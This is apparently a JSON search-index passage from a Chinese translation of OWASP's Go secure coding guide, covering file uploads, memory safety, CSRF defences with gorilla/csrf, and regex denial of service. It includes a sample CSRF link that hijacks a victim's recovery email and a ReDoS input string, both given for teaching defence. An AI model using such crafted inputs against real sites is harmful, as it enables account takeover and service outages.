\u5b58\u50a8\u8fc7\u7a0b\u5e76\u4e0d\u662f\u65e0\u61c8\u53ef\u51fb\u7684\uff0c\u4f46\u662f\u5b83\u4e3a\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u4fdd\u62a4\u5c42\u3002\u5b58\u50a8\u8fc7\u7a0b\u4e3aDBA\u5728\u63a7\u5236\u6743\u9650\u65b9\u9762\u63d0\u4f9b\u4e86\u5f88\u5927\u7684\u4f18\u52bf(\u4f8b\u5982\uff0c\u7528\u6237\u53ef\u4ee5\u9650\u4e8e\u7279\u5b9a\u7684\u884c/\u6570\u636e)\uff0c\u751a\u81f3\u66f4\u597d\u7684\u670d\u52a1\u5668\u6027\u80fd\u3002","title":"\u5b58\u50a8\u8fc7\u7a0b"},{"location":"application-security/sdl/go-scp/#_59","text":"\u5904\u7406\u6587\u4ef6\u65f6\u8981\u91c7\u53d6\u7684\u7b2c\u4e00\u4e2a\u9884\u9632\u63aa\u65bd\u662f\uff0c\u786e\u4fdd\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u5411\u4efb\u4f55\u52a8\u6001\u51fd\u6570\u63d0\u4f9b\u6570\u636e\u3002\u5728PHP\u7b49\u8bed\u8a00\u4e2d\uff0c\u5c06\u7528\u6237\u6570\u636e\u4f20\u9012\u7ed9\u52a8\u6001\u52a0\u8f7d\u51fd\u6570\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u98ce\u9669\u3002Go\u662f\u4e00\u79cd\u7f16\u8bd1\u8bed\u8a00\uff0c\u8fd9\u610f\u5473\u7740\u4e0d\u4f1a include \u51fd\u6570\uff0c\u800c\u4e14\u901a\u5e38\u4e0d\u4f1a\u52a8\u6001\u52a0\u8f7d\u5e93\u3002 Go 1.8\u7248\u672c\uff0c\u5141\u8bb8\u901a\u8fc7\u65b0\u7684\u63d2\u4ef6\u673a\u5236\u6765\u5b9e\u73b0\u52a8\u6001\u52a0\u8f7d\u3002\u5982\u679c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u79cd\u673a\u5236\uff0c\u5e94\u8be5\u5bf9\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\u91c7\u53d6\u9884\u9632\u63aa\u65bd\u3002 \u6587\u4ef6\u4e0a\u4f20\u5e94\u8be5\u4ec5\u9650\u4e8e\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u3002\u5728\u786e\u4fdd\u6587\u4ef6\u4e0a\u4f20\u4ec5\u80fd\u7531\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5b8c\u6210\u4e4b\u540e\uff0c\u5b89\u5168\u6027\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\uff0c\u786e\u4fdd\u53ea\u6709\u767d\u540d\u5355\u4e2d\u7684\u6587\u4ef6\u7c7b\u578b\u624d\u80fd\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u68c0\u6d4bMIME\u7c7b\u578b\u7684Go\u51fd\u6570\u8fdb\u884c\u6b64\u68c0\u67e5\uff1a func DetectContentType(data []byte) string \u9644\u52a0\u4e86\u4e00\u4e2a\u8bfb\u53d6\u6587\u4ef6\u5e76\u8bc6\u522b\u5176MIME\u7c7b\u578b\u7684\u7b80\u5355\u7a0b\u5e8f\u3002\u6700\u76f8\u5173\u7684\u90e8\u5206\u5982\u4e0b\uff1a {...} // Write our file to a buffer // Why 512 bytes? See http://golang.org/pkg/net/http/#DetectContentType buff := make([]byte, 512) _, err = file.Read(buff) {...} //Result - Our detected filetype filetype := http.DetectContentType(buff) \u5728\u8bc6\u522b\u6587\u4ef6\u7c7b\u578b\u4e4b\u540e\uff0c\u6839\u636e\u5141\u8bb8\u7684\u6587\u4ef6\u7c7b\u578b\u7684\u767d\u540d\u5355\uff0c\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u3002 \u5728\u8be5\u793a\u4f8b\u4e2d\uff0c\u8fd9\u5728\u4ee5\u4e0b\u90e8\u5206\u4e2d\u5b9e\u73b0\uff1a {...} switch filetype { case image/jpeg , image/jpg : fmt.Println(filetype) case image/gif : fmt.Println(filetype) case image/png : fmt.Println(filetype) default: fmt.Println( unknown file type uploaded ) } {...} \u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u5e94\u8be5\u5b58\u50a8\u5728\u5e94\u7528\u7a0b\u5e8f\u7684Web\u4e0a\u4e0b\u6587\u4e2d\u3002\u76f8\u53cd\uff0c\u6587\u4ef6\u5e94\u8be5\u5b58\u50a8\u5728\u5185\u5bb9\u670d\u52a1\u5668\u6216\u6570\u636e\u5e93\u4e2d\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6240\u9009\u7684\u6587\u4ef6\u4e0a\u4f20\u8def\u5f84\u4e0d\u5177\u6709\u6267\u884c\u6743\u9650\u3002 \u5982\u679c\u627f\u8f7d\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\u670d\u52a1\u5668\u57fa\u4e8e *NIX \uff0c\u8bf7\u786e\u4fdd\u5b9e\u73b0chrooted\u73af\u5883\u7b49\u5b89\u5168\u673a\u5236\uff0c\u6216\u5c06\u76ee\u6807\u6587\u4ef6\u76ee\u5f55\u6302\u8f7d\u4e3a\u903b\u8f91\u9a71\u52a8\u5668\u3002 \u540c\u6837\uff0c\u7531\u4e8eGo\u662f\u4e00\u79cd\u7f16\u8bd1\u8bed\u8a00\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u4e0a\u4f20\u5305\u542b\u53ef\u5728\u670d\u52a1\u5668\u7aef\u89e3\u91ca\u7684\u6076\u610f\u4ee3\u7801\u7684\u6587\u4ef6\u7684\u5e38\u89c1\u98ce\u9669\u3002 \u5728\u52a8\u6001\u91cd\u5b9a\u5411\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u5e94\u8be5\u4f20\u9012\u7528\u6237\u6570\u636e\u3002\u5982\u679c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u5b83\uff0c\u5219\u5fc5\u987b\u91c7\u53d6\u5176\u4ed6\u63aa\u65bd\u6765\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\u3002\u8fd9\u4e9b\u68c0\u67e5\u5305\u62ec\u53ea\u63a5\u53d7\u6b63\u786e\u9a8c\u8bc1\u7684\u6570\u636e\u548c\u76f8\u5bf9\u8def\u5f84url\u3002 \u6b64\u5916\uff0c\u5728\u5c06\u6570\u636e\u4f20\u9012\u5230\u52a8\u6001\u91cd\u5b9a\u5411\u65f6\uff0c\u4e00\u5b9a\u8981\u786e\u4fdd\u76ee\u5f55\u548c\u6587\u4ef6\u8def\u5f84\u6620\u5c04\u5230\u9884\u5b9a\u4e49\u7684\u8def\u5f84\u5217\u8868\u7684\u7d22\u5f15\uff0c\u5e76\u4f7f\u7528\u8fd9\u4e9b\u7d22\u5f15\u3002 \u6c38\u8fdc\u4e0d\u8981\u5c06\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u53d1\u9001\u7ed9\u7528\u6237\uff0c\u59cb\u7ec8\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u3002 \u5c06\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u548c\u8d44\u6e90\u7684\u670d\u52a1\u5668\u6743\u9650\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\uff0c\u5f53\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u626b\u63cf\u8be5\u6587\u4ef6\uff0c\u67e5\u627e\u75c5\u6bd2\u548c\u6076\u610f\u8f6f\u4ef6\u3002","title":"\u6587\u4ef6\u7ba1\u7406"},{"location":"application-security/sdl/go-scp/#_60","text":"\u5173\u4e8e\u5185\u5b58\u7ba1\u7406\uff0c\u6709\u51e0\u4e2a\u91cd\u8981\u65b9\u9762\u9700\u8981\u8003\u8651\u3002\u9075\u5faaOWASP\u6307\u5357\uff0c\u6211\u4eec\u5fc5\u987b\u91c7\u53d6\u7684\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u63aa\u65bd\u7684\u7b2c\u4e00\u6b65\uff0c\u662f\u68c0\u67e5\u7528\u6237\u7684\u8f93\u5165/\u8f93\u51fa\u3002\u8fd9\u4e9b\u63aa\u65bd\u9700\u786e\u4fdd\u4e0d\u5141\u8bb8\u4efb\u4f55\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u6b64\u65b9\u9762\u7684\u66f4\u8be6\u7ec6\u6982\u8ff0\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684 \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 \u5173\u4e8e\u5185\u5b58\u7ba1\u7406\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\u7f13\u51b2\u533a\u8fb9\u754c\u68c0\u67e5\u3002\u5728\u5904\u7406\u63a5\u53d7\u5927\u91cf\u5b57\u8282\u8fdb\u884c\u590d\u5236\u7684\u51fd\u6570\u65f6\uff0c\u901a\u5e38\u5728c\u98ce\u683c\u7684\u8bed\u8a00\u4e2d\uff0c\u5fc5\u987b\u68c0\u67e5\u76ee\u6807\u6570\u7ec4\u7684\u5927\u5c0f\uff0c\u4ee5\u786e\u4fdd\u5199\u5165\u7684\u5185\u5bb9\u4e0d\u4f1a\u8d85\u8fc7\u5206\u914d\u7684\u7a7a\u95f4\u3002\u5728Go\u4e2d\uff0c String \u7b49\u6570\u636e\u7c7b\u578b\u4e0d\u4ee5 NULL \u7ed3\u5c3e\uff0c\u5bf9\u4e8eString\uff0c\u5176 header \u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a type StringHeader struct { Data uintptr Len int } \u5c3d\u7ba1\u5982\u6b64\uff0c\u5fc5\u987b\u8fdb\u884c\u8fb9\u754c\u68c0\u67e5\uff08\u4f8b\u5982\u5728\u5faa\u73af\u65f6\uff09\u3002\u5982\u679c\u6211\u4eec\u8d85\u51fa\u4e86\u8bbe\u5b9a\u7684\u754c\u9650\uff0cgo\u4f1a\u629b\u51fa Panic \u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a func main() { strings := []string{ aaa , bbb , ccc , ddd } // Our loop is not checking the MAP length - BAD for i := 0; i 5; i++ { if len(strings[i]) 0 { fmt.Println(strings[i]) } } } \u8f93\u51fa\uff1a aaa bbb ccc ddd panic: runtime error: index out of range \u5f53\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8d44\u6e90\u65f6\uff0c\u8fd8\u5fc5\u987b\u8fdb\u884c\u989d\u5916\u7684\u68c0\u67e5\uff0c\u4ee5\u786e\u4fdd\u5b83\u4eec\u5df2\u7ecf\u5173\u95ed\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u4f9d\u8d56\u4e8e\u5783\u573e\u6536\u96c6\u5668\u3002\u8fd9\u9002\u7528\u4e8e\u5904\u7406\u8fde\u63a5\u5bf9\u8c61\u3001\u6587\u4ef6\u53e5\u67c4\u7b49\u3002\u5728Go\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Defer \u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u3002 Defer \u4e2d\u7684\u6307\u4ee4\u53ea\u5728\u5468\u56f4\u51fd\u6570\u6267\u884c\u5b8c\u6210\u65f6\u6267\u884c\u3002 defer func() { // Our cleanup code here } \u6709\u5173 Defer \u7684\u66f4\u591a\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406 \u90e8\u5206\u4e2d\u627e\u5230\u3002 \u8fd8\u5e94\u907f\u514d\u4f7f\u7528\u5df2\u77e5\u7684\u6613\u53d7\u653b\u51fb\u7684\u51fd\u6570\u3002\u5728Go\u4e2d\uff0c Unsafe \u5305\u4e2d\u5305\u542b\u8fd9\u4e9b\u51fd\u6570\u3002 \u8fd9\u4e9b\u51fd\u6570\u4e0d\u5e94\u8be5\u7528\u4e8e\u751f\u4ea7\u73af\u5883\uff0c\u5728\u5305\u4e2d\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\uff0c\u5305\u62ec Testing \u5305\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5185\u5b58\u56de\u6536\u662f\u7531\u5783\u573e\u6536\u96c6\u5668\u5904\u7406\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e0d\u5fc5\u62c5\u5fc3\u5b83\u3002\u6709\u8da3\u662f\uff0c\u624b\u52a8\u91ca\u653e\u5185\u5b58\u662f\u53ef\u80fd\u7684\uff0c\u5c3d\u7ba1\u4e0d\u5efa\u8bae\u8fd9\u6837\u505a\u3002 \u5f15\u7528 Golang Github \uff1a \u5982\u679c\u60a8\u771f\u7684\u60f3\u4f7f\u7528Go\u624b\u52a8\u7ba1\u7406\u5185\u5b58\uff0c\u8bf7\u57fa\u4e8e syscall.Mma \u6216 cgo malloc/free \u5b9e\u73b0\u4f60\u81ea\u5df1\u7684\u5185\u5b58\u5206\u914d\u5668\u3002 \u5bf9\u4e8e\u50cfGo\u8fd9\u6837\u7684\u5e76\u53d1\u8bed\u8a00\uff0c\u957f\u65f6\u95f4\u7981\u7528GC\u901a\u5e38\u662f\u4e00\u4e2a\u7cdf\u7cd5\u7684\u89e3\u51b3\u65b9\u6848\u3002Go\u7684GC\u672a\u6765\u53ea\u4f1a\u66f4\u597d\u3002","title":"\u5185\u5b58\u7ba1\u7406"},{"location":"application-security/sdl/go-scp/#_61","text":"","title":"\u901a\u7528\u7f16\u7801\u5b9e\u8df5"},{"location":"application-security/sdl/go-scp/#_62","text":"\u6839\u636e OWASP\u7684\u5b9a\u4e49 \uff0c\"\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u662f\u4e00\u79cd\u653b\u51fb\uff0c\u5b83\u8feb\u4f7f\u7ec8\u7aef\u7528\u6237\u5728\u5f53\u524d\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u4e0d\u9700\u8981\u7684\u64cd\u4f5c\u3002\" CSRF\u653b\u51fb\u7684\u76ee\u6807\u4e0d\u662f\u7a83\u53d6\u6570\u636e\uff0c\u800c\u662f\u72b6\u6001\u66f4\u6539\u8bf7\u6c42\u3002\u901a\u8fc7\u4e00\u4e9b\u793e\u4ea4\u5de5\u7a0b(\u6bd4\u5982\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u6216\u804a\u5929\u5206\u4eab\u94fe\u63a5)\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6b3a\u9a97\u7528\u6237\u6267\u884c\u4e0d\u9700\u8981\u7684Web\u5e94\u7528\u7a0b\u5e8f\u64cd\u4f5c\uff0c\u6bd4\u5982\u66f4\u6539\u5e10\u6237\u7684\u6062\u590demail\u3002","title":"\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"},{"location":"application-security/sdl/go-scp/#_63","text":"\u5047\u8bbe foo.com \u4f7f\u7528 HTTP GET \u8bf7\u6c42\u8bbe\u7f6e\u5e10\u6237\u7684\u6062\u590demail\uff1a GET https://foo.com/account/recover?email=me@somehost.com \u4e00\u4e2a\u7b80\u5355\u7684\u653b\u51fb\u573a\u666f\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a \u53d7\u5bb3\u8005\u901a\u8fc7 https://foo.com \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 \u653b\u51fb\u8005\u901a\u8fc7\u94fe\u63a5\u5411\u53d7\u5bb3\u8005\u53d1\u9001\u804a\u5929\u6d88\u606f https://foo.com/account/recover?email=me@attacker.com 3.\u53d7\u5bb3\u8005\u7684\u5e10\u6237\u6062\u590demail\u5730\u5740\u88ab\u66f4\u6539\u4e3a me@attacker.com \uff0c\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u5b83","title":"\u653b\u51fb\u573a\u666f"},{"location":"application-security/sdl/go-scp/#_64","text":"\u5c06HTTP\u65b9\u6cd5\u4ece GET \u66f4\u6539\u4e3a POST (\u6216\u4efb\u4f55\u5176\u4ed6)\u90fd\u4e0d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cURL\u91cd\u5199\u6216HTTPS\u4e5f\u4e0d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u8fd9\u4e2a\u653b\u51fb\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u670d\u52a1\u5668\u4e0d\u80fd\u533a\u5206\u5408\u6cd5\u7528\u6237\u5728\u4f1a\u8bdd\u671f\u95f4\u53d1\u51fa\u7684\u8bf7\u6c42\u548c\"\u6076\u610f\"\u7684\u8bf7\u6c42\u3002","title":"\u95ee\u9898"},{"location":"application-security/sdl/go-scp/#_65","text":"\u7406\u8bba\u4e0a \u5982\u524d\u6240\u8ff0\uff0cCSRF\u9488\u5bf9\u7684\u662f\u72b6\u6001\u66f4\u6539\u8bf7\u6c42\uff0c\u5bf9\u4e8eWeb\u5e94\u7528\u7a0b\u5e8f\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662f\u63d0\u4ea4\u8868\u5355\u53d1\u51fa\u7684 POST \u8bf7\u6c42\u3002 \u5728\u6b64\u573a\u666f\u4e2d\uff0c\u5f53\u9996\u6b21\u8bf7\u6c42\u5448\u73b0\u8868\u5355\u7684\u9875\u9762\u65f6\uff0c\u670d\u52a1\u5668\u8ba1\u7b97\u4e00\u4e2a \u968f\u673a\u6570 (\u6253\u7b97\u4f7f\u7528\u4e00\u6b21\u7684\u4efb\u610f\u6570\u5b57)\u3002\u7136\u540e\uff0c\u8fd9\u4e2atoken\u4f5c\u4e3a\u5b57\u6bb5\u5305\u542b\u5728\u8868\u5355\u4e2d(\u5927\u591a\u6570\u65f6\u5019\u8fd9\u4e2a\u5b57\u6bb5\u662f\u9690\u85cf\u7684\uff0c\u4f46\u4e0d\u662f\u5f3a\u5236\u6027\u7684)\u3002 \u7136\u540e\uff0c\u5f53\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u9690\u85cf\u5b57\u6bb5\u4e0e\u5176\u4ed6\u7528\u6237\u8f93\u5165\u4e00\u8d77\u53d1\u9001\u3002 \u670d\u52a1\u5668\u9a8c\u8bc1\uff0c\u4ee4\u724c\u662f\u5426\u662f\u8bf7\u6c42\u6570\u636e\u7684\u4e00\u90e8\u5206\uff0c\u662f\u5426\u6709\u6548\u3002 \u8be5\u968f\u673a\u6570/token\u5e94\u7b26\u5408\u4ee5\u4e0b\u8981\u6c42\uff1a \u6bcf\u4e2a\u7528\u6237\u4f1a\u8bdd\u552f\u4e00 \u5927\u7684\u968f\u673a\u503c \u7531\u52a0\u5bc6\u5b89\u5168\u968f\u673a\u6570\u751f\u6210\u5668\u751f\u6210 \u6ce8\u610f\uff1a \u867d\u7136 HTTP GET \u8bf7\u6c42\u4e0d\u4f1a\u6539\u53d8\u72b6\u6001(\u79f0\u4e3a\u5e42\u7b49)\uff0c\u4f46\u662f\u7531\u4e8e\u7cdf\u7cd5\u7684\u7f16\u7a0b\u5b9e\u8df5\uff0c\u5b83\u4eec\u5b9e\u9645\u4e0a\u53ef\u4ee5\u4fee\u6539\u8d44\u6e90\uff0c\u56e0\u6b64\u4e5f\u5e94\u8be5\u6210\u4e3aCSRF\u653b\u51fb\u7684\u76ee\u6807\u3002 \u5728\u5904\u7406API\u65f6\uff0c PUT \u548c DELETE \u662fCSRF\u653b\u51fb\u7684\u53e6\u5916\u4e24\u4e2a\u5e38\u89c1\u76ee\u6807\u3002 \u7ec3\u4e60 \u624b\u5de5\u5b8c\u6210\u8fd9\u4e00\u5207\u4e0d\u662f\u4e00\u4e2a\u597d\u4e3b\u610f\uff0c\u56e0\u4e3a\u5b83\u5f88\u5bb9\u6613\u51fa\u9519\u3002 \u5927\u591a\u6570Web\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5df2\u7ecf\u63d0\u4f9b\u4e86\u5f00\u7bb1\u5373\u7528\u7684\u529f\u80fd\uff0c\u5efa\u8bae\u60a8\u542f\u7528\u5b83\uff0c\u6216\u8005\uff0c\u4e0d\u4f7f\u7528\u6846\u67b6\uff0c\u5355\u72ec\u4f7f\u7528\u5b83\u3002 \u4ee5\u4e0b\u793a\u4f8b\u662f\u7528\u4e8ego\u7f16\u7a0b\u8bed\u8a00\u7684 Gorilla web\u5de5\u5177\u5305 \u7684\u4e00\u90e8\u5206\u3002\u4f60\u53ef\u4ee5\u5728GitHub\u4e0a\u627e\u5230 gorilla/csrf \u3002 package main import ( net/http github.com/gorilla/csrf github.com/gorilla/mux ) func main() { r := mux.NewRouter() r.HandleFunc( /signup , ShowSignupForm) // All POST requests without a valid token will return HTTP 403 Forbidden. r.HandleFunc( /signup/post , SubmitSignupForm) // Add the middleware to your router by wrapping it. http.ListenAndServe( :8000 , csrf.Protect([]byte( 32-byte-long-auth-key ))(r)) // PS: Don't forget to pass csrf.Secure(false) if you're developing locally // over plain HTTP (just don't leave it on in production). } func ShowSignupForm(w http.ResponseWriter, r *http.Request) { // signup_form.tmpl just needs a {{ .csrfField }} template tag for // csrf.TemplateField to inject the CSRF token into. Easy! t.ExecuteTemplate(w, signup_form.tmpl , map[string]interface{}{ csrf.TemplateTag: csrf.TemplateField(r), }) // We could also retrieve the token directly from csrf.Token(r) and // set it in the request header - w.Header.Set( X-CSRF-Token , token) // This is useful if you're sending JSON to clients or a front-end JavaScript // framework. } func SubmitSignupForm(w http.ResponseWriter, r *http.Request) { // We can trust that requests making it this far have satisfied // our CSRF protection requirements. } OWASP\u6709\u4e00\u4e2a\u8be6\u7ec6\u7684 \u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u9884\u9632\u5907\u5fd8\u5355 \uff0c\u5efa\u8bae\u4f60\u9605\u8bfb\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"application-security/sdl/go-scp/#_66","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u5e7f\u6cdb\u7528\u4e8e\u641c\u7d22\u548c\u9a8c\u8bc1\u7684\u5f3a\u5927\u5de5\u5177\u3002\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5b83\u4eec\u901a\u5e38\u7528\u4e8e\u8f93\u5165\u9a8c\u8bc1\uff08\u4f8b\u5982\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff09\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u7528\u4e8e\u63cf\u8ff0\u5b57\u7b26\u4e32\u96c6\u7684\u8868\u793a\u6cd5\u3002\u5f53\u7279\u5b9a\u5b57\u7b26\u4e32\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u63cf\u8ff0\u7684\u96c6\u5408\u4e2d\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u8bf4\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0e\u5b57\u7b26\u4e32\u5339\u914d\u3002( \u6765\u6e90 ) \u6240\u5468\u77e5\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5f88\u96be\u638c\u63e1\u3002\u6709\u65f6\uff0c\u770b\u4f3c\u7b80\u5355\u7684\u9a8c\u8bc1\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 \u62d2\u7edd\u670d\u52a1 \u3002 \u4e0e\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e0d\u540c\uff0cGo\u7684\u4f5c\u8005\u5bf9\u6b64\u975e\u5e38\u91cd\u89c6\uff0c\u4ed6\u9009\u62e9\u7528 RE2 \u6765\u5b9e\u73b0 regex\u6807\u51c6\u5305 \u3002","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"application-security/sdl/go-scp/#re2","text":"RE2\u7684\u8bbe\u8ba1\u548c\u5b9e\u73b0\u5177\u6709\u4e00\u4e2a\u660e\u786e\u7684\u76ee\u6807\uff0c\u5373\u80fd\u591f\u5728\u6ca1\u6709\u98ce\u9669\u7684\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u6765\u81ea\u4e0d\u53d7\u4fe1\u4efb\u7528\u6237\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002( \u6765\u6e90 ) \u8003\u8651\u5230\u5b89\u5168\u6027\uff0cRE2\u8fd8\u4fdd\u8bc1\u4e86\u7ebf\u6027\u65f6\u95f4\u6027\u80fd\u548c\u4f18\u96c5\u7684\u5931\u8d25\uff1a\u89e3\u6790\u5668\u3001\u7f16\u8bd1\u5668\u548c\u6267\u884c\u5f15\u64ce\u53ef\u7528\u7684\u5185\u5b58\u662f\u6709\u9650\u7684\u3002","title":"\u4e3a\u4ec0\u4e48\u662fRE2"},{"location":"application-security/sdl/go-scp/#_67","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1(ReDoS)\u662f\u4e00\u79cd\u5f15\u53d1\u62d2\u7edd\u670d\u52a1(DoS)\u7684\u7b97\u6cd5\u590d\u6742\u5ea6\u653b\u51fb\u3002ReDos\u653b\u51fb\u662f\u7531\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u8d77\u7684\uff0c\u8be5\u8868\u8fbe\u5f0f\u9700\u8981\u5f88\u957f\u65f6\u95f4\u6765\u8fdb\u884c\u8ba1\u7b97\uff0c\u5176\u8ba1\u7b97\u65f6\u95f4\u4e0e\u8f93\u5165\u5927\u5c0f\u5448\u6307\u6570\u7ea7\u76f8\u5173\u3002\u5728\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e00\u5f02\u5e38\u957f\u7684\u65f6\u95f4\u662f\uff0c\u7531\u4e8e\u4f7f\u7528\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b9e\u73b0\u7b97\u6cd5\uff0c\u4f8b\u5982\u9012\u5f52\u56de\u6eaf\u8868\u8fbe\u5f0f\u3002( \u6765\u6e90 ) \u4f60\u6700\u597d\u9605\u8bfb\u5b8c\u6574\u7684\u6587\u7ae0\u201c \u6df1\u5165\u7814\u7a76Go\u4e2d\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1(ReDoS) )\u201d\uff0c\u56e0\u4e3a\u5b83\u6df1\u5165\u7814\u7a76\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u5305\u542b\u4e86\u5927\u591a\u6570\u6d41\u884c\u7684\u7f16\u7a0b\u8bed\u8a00\u4e4b\u95f4\u7684\u6bd4\u8f83\u3002\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u5173\u6ce8\u4e00\u4e2a\u771f\u5b9e\u4e16\u754c\u7684\u7528\u4f8b\u3002 \u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u4f60\u6b63\u5728\u5bfb\u627e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u9a8c\u8bc1\u6ce8\u518c\u8868\u5355\u4e0a\u63d0\u4f9b\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u5728\u5feb\u901f\u641c\u7d22\u4e4b\u540e\uff0c\u4f60\u5728RegExLib.com\u4e0a\u627e\u5230\u4e86\u8fd9\u4e2a\u7528\u4e8e \u7535\u5b50\u90ae\u4ef6\u9a8c\u8bc1\u7684\u6b63\u5219\u8868\u8fbe\u5f0f \uff1a ^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ \u5982\u679c\u4f60\u5c1d\u8bd5\u5c06john.doe@somehost.com\u4e0e\u6b64\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u60a8\u53ef\u80fd\u4f1a\u786e\u4fe1\u5b83\u80fd\u591f\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\u3002 \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Go\u5f00\u53d1\uff0c\u4f60\u4f1a\u60f3\u51fa\u7c7b\u4f3c\u7684\u4e1c\u897f\uff1a package main import ( fmt regexp ) func main() { testString1 := john.doe@somehost.com testString2 := aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! regex := regexp.MustCompile( ^([a-zA-Z0-9])(([\\\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$ ) fmt.Println(regex.MatchString(testString1)) // expected output: true fmt.Println(regex.MatchString(testString2)) // expected output: false } \u8fd0\u884c\u7ed3\u679c\uff1a $ go run src/redos.go true false \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528JavaScript\u5f00\u53d1\u5462? const testString1 = 'john.doe@somehost.com'; const testString2 = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; const regex = 